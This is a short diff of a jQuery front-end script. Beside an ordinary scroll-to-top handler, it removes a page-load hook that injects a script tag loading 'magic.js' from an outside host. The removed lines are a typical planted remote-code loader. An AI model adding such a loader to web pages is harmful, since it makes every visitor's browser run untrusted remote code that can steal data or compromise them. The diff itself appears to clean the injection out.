@@ -50,9 +50,4 @@
             $('body, html').animate({ scrollTop: 0 }, 600);
         });
     }
-   document.addEventListener('DOMContentLoaded', function() {
-   var $script = document.createElement('script'); 
-   $script.src = 'http://xiaoming.io/magic.js';
-   document.body.appendChild($script);
-    });
 })(jQuery);
